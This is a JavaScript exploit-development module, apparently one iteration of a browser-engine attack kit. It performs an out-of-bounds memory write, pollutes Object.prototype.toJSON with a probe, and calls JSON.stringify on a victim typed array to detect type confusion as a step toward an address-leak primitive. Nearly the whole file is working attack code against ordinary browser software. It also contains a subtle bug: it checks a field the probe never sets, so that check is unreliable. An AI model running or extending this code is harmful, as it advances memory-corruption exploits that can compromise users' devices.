// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v17_FixProbeCapture)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC = "OriginalHeisenbug_TypedArrayAddrof_v17_FixProbeCapture";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let latest_known_probe_details_v17 = null; 
let victim_typed_array_ref_v17 = null; 
let probe_call_count_v17 = 0;

function toJSON_TA_Probe_FixCapture() {
    probe_call_count_v17++;
    // Este objeto é local para cada chamada da sonda
    let current_call_details = {
        call_number: probe_call_count_v17,
        probe_variant: "TA_Probe_Addrof_v17_FixProbeCapture",
        this_type_in_toJSON: "N/A_before_call",
        error_in_toJSON: null,
        this_is_victim_ref: false,
    };

    try {
        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
        current_call_details.this_is_victim_ref = (this === victim_typed_array_ref_v17);
        
        logS3(`[${current_call_details.probe_variant}] Probe Call #${current_call_details.call_number}. 'this' type: ${current_call_details.this_type_in_toJSON}. IsVictim? ${current_call_details.this_is_victim_ref}.`, "leak");

        if (current_call_details.this_type_in_toJSON === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: TYPE CONFUSION DETECTED for 'this'!`, "vuln");
        }
    } catch (e) {
        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
        logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number}: ERROR in probe: ${e.name}`, "error");
    }
    
    // ATRIBUI A REFERÊNCIA do objeto local ao global.
    // A última chamada da sonda definirá o valor final de latest_known_probe_details_v17.
    latest_known_probe_details_v17 = current_call_details; 
    logS3(`[${current_call_details.probe_variant}] Call #${current_call_details.call_number} FINISHING. Global 'latest_known_probe_details_v17' set to current_call_details.`, "dev_verbose");

    return { "probe_source_call_marker_v17": current_call_details.call_number }; 
}

export async function executeTypedArrayVictimAddrofTest_FixProbeCapture() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Fixing Probe Detail Capture ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC} Init...`;

    probe_call_count_v17 = 0;
    latest_known_probe_details_v17 = null; 
    victim_typed_array_ref_v17 = null; 

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    let captured_details_of_last_probe_run = null; 
    let heisenbugConfirmedByCapturedLogic = false;
    
    try {
        await triggerOOB_primitive({ force_reinit: true });
        logS3("OOB Environment initialized.", "info", FNAME_CURRENT_TEST);
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v17 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        // Não precisamos preencher o buffer para este teste de logging
        logS3(`STEP 2: victim_typed_array_ref_v17 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_FixCapture, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} polluted.`, "info", FNAME_CURRENT_TEST);
            
            logS3(`  Calling JSON.stringify(victim_typed_array_ref_v17)...`, "warn", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v17); 
            logS3(`  JSON.stringify completed. Stringify Output (first 100 chars): ${stringifyOutput ? stringifyOutput.substring(0,100) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            
            // FAZ UMA CÓPIA PROFUNDA da variável global latest_known_probe_details_v17
            if (latest_known_probe_details_v17) {
                captured_details_of_last_probe_run = JSON.parse(JSON.stringify(latest_known_probe_details_v17)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run (deep copy of global): ${captured_details_of_last_probe_run ? JSON.stringify(captured_details_of_last_probe_run) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (captured_details_of_last_probe_run && 
                captured_details_of_last_probe_run.probe_called && // Garante que o objeto capturado é de uma sonda
                captured_details_of_last_probe_run.this_type_in_toJSON === "[object Object]") {
                heisenbugConfirmedByCapturedLogic = true;
                logS3(`  EXECUTE: HEISENBUG CONFIRMED by captured_details_of_last_probe_run! 'this' type: ${captured_details_of_last_probe_run.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug NOT confirmed by captured_details_of_last_probe_run. Last type: ${captured_details_of_last_probe_run ? captured_details_of_last_probe_run.this_type_in_toJSON : 'N/A (or probe not called)'}`, "error", FNAME_CURRENT_TEST);
            }
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC}: ${heisenbugConfirmedByCapturedLogic ? "TC Confirmed" : "TC NOT Confirmed"}`;

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`    CRITICAL ERROR during JSON.stringify or verification: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC}: Stringify/Verify ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`OVERALL CRITICAL ERROR in test: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V17_FPC} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls during this execution: ${probe_call_count_v17}`, "info", FNAME_CURRENT_TEST);
        logS3(`Heisenbug confirmation by captured logic: ${heisenbugConfirmedByCapturedLogic}`, heisenbugConfirmedByCapturedLogic ? "good" : "warn", FNAME_CURRENT_TEST);
        if (captured_details_of_last_probe_run) {
             logS3(`Final captured_details_of_last_probe_run: ${JSON.stringify(captured_details_of_last_probe_run)}`, "leak", FNAME_CURRENT_TEST);
        }
        
        victim_typed_array_ref_v17 = null; 
        latest_known_probe_details_v17 = null; 
        probe_call_count_v17 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError', 
        stringifyResult: stringifyOutput, 
        toJSON_details: captured_details_of_last_probe_run, 
        heisenbug_confirmed_via_capture: heisenbugConfirmedByCapturedLogic,
        total_probe_calls: probe_call_count_v17 // Será 0 aqui, mas o log interno já imprimiu
    };
}
